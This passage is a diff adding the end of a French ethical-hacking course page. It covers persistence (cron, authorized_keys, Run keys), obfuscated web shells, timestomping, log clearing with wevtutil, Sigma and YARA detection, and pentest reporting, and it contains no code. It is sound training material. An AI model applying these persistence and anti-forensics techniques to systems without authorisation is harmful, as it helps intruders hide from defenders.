+      <li>Tenter un effacement brutal des journaux Windows (wevtutil) déclenchant immédiatement l'événement d'alerte 1102.</li>
+    </ul>
+  </div>
+
+<h2>9. Méthodologie de résolution</h2>
+
+  <div class="box box--method">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-compass"></use></svg> Démarche d’ingénierie pas à pas</div>
+    <ol>
+      <li>Évaluer la résilience défensive en testant des mécanismes discrets de persistance (cron, authorized_keys).</li>
+      <li>Analyser les traces résiduelles dans les journaux d'événements pour mesurer la visibilité du SOC.</li>
+      <li>Procéder au nettoyage intégral et documenté de tous les artefacts déposés sur l'infrastructure client.</li>
+      <li>Agréger et pondérer l'ensemble des vulnérabilités découvertes pour calculer la posture de risque global.</li>
+      <li>Rédiger le rapport de pentest complet avec synthèse managériale, preuves de concept et feuille de route.</li>
+    </ol>
+  </div>
+
+<h2>10. Révision active</h2>
+
+  <div class="box box--revision">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-pin"></use></svg> Résumé essentiel</div>
+    <ul>
+      <li>Le maintien de l'accès exploite des mécanismes de démarrage légitimes (cron, systemd, authorized_keys, clés Run du Registre).</li>
+      <li>Les web shells dissimulent leur code via des encodages Base64 et des fonctions d'exécution dynamique (eval, assert).</li>
+      <li>Les techniques d'anti-forensics comme le timestomping cherchent à tromper l'investigation numérique des analystes DFIR.</li>
+      <li>La Blue Team surveille les activités suspectes grâce aux SIEM/EDR alimentés par des règles Sigma et YARA.</li>
+      <li>Le rapport d'intrusion est le livrable fondamental du pentesteur : il articule Executive Summary et fiches techniques détaillées.</li>
+    </ul>
+    <h3>Checklist de maîtrise</h3>
+    <ul class="check">
+      <li>Je sais auditer et détecter les mécanismes de persistance et les web shells obfusqués.</li>
+      <li>Je comprends les principes des règles de détection comportementale Sigma et YARA.</li>
+      <li>Je maîtrise la structure normalisée d'un rapport de test d'intrusion professionnel (PTES).</li>
+      <li>Je sais rédiger une synthèse managériale impactante et structurer un plan de remédiation par horizon.</li>
+    </ul>
+    <h3>Les 8 notions à connaître absolument</h3>
+    <ol>
+      <li><strong>Persistance :</strong> Mécanisme garantissant la survie d'un accès après le redémarrage d'un serveur ou la déconnexion de l'utilisateur.</li><li><strong>Web Shell :</strong> Script backdoor déposé sur un serveur web permettant l'exécution distante de commandes système via HTTP.</li><li><strong>Timestomping :</strong> Technique d'anti-forensics modifiant les horodatages MACB d'un fichier pour le dissimuler parmi les binaires système.</li><li><strong>Règles Sigma :</strong> Format ouvert et générique de détection de comportements suspects dans les journaux d'événements SIEM.</li><li><strong>Executive Summary :</strong> Synthèse managériale non-technique d'un rapport d'intrusion exposant le risque global et les impacts métier.</li>
+    </ol>
+    <p><a class="btn" href="cartes.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-cards"></use></svg> Réviser avec les flashcards</a>
+       <a class="btn" href="formules.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-file"></use></svg> Mémo syntaxe</a></p>
+  </div>
+
+<h2>11. Test de maîtrise</h2>
+
+  <div class="box box--tech">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-chart"></use></svg> Comment t'auto-évaluer</div>
+    <p>Le QCM ci-dessus est un test de maîtrise. Lis ton pourcentage :</p>
+    <div class="bands">
+      <div class="bandrow bandrow--low">&lt; 50 % — Reprends les sections théoriques et revois les définitions clés.</div>
+      <div class="bandrow bandrow--mid">50–69 % — Pratique les exercices N1 de l'atelier avant de retenter le test.</div>
+      <div class="bandrow bandrow--good">70–89 % — Bon niveau opérationnel : affine les cas limites et les options d'outils.</div>
+      <div class="bandrow bandrow--top">≥ 95 % — Maîtrise d'ingénierie validée : passe au module suivant.</div>
+    </div>
+    <p style="margin-top:12px"><label class="checkbox"><input type="checkbox" data-mark-done> <span>Je considère ce chapitre maîtrisé (≥ 95 % au test de maîtrise).</span></label></p>
+  </div>
+
+  <div class="chnav">
+    <a class="btn" href="../sommaire.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-arrow-left"></use></svg> Sommaire</a>
+    <a class="btn btn--primary" href="../atelier.html">Atelier de code <svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-arrow-right"></use></svg></a>
+  </div>
+
+  <p class="disclaimer">Objectif de maîtrise 19/20 — ta note réelle dépend aussi de ton travail.
+  Sources : Programme officiel Certified Ethical Hacker (CEH v12), Référentiels PTES (Penetration Testing Execution Standard), OWASP Web Security Testing Guide (WSTG v4.2), NIST SP 800-115, Documentation GTFOBins & MITRE ATT&CK.</p>
+</main>
+
+<script src="../assets/js/cours.js"></script>
+<script src="/assets/js/code-lab.js" defer></script>
+</body>
+</html>
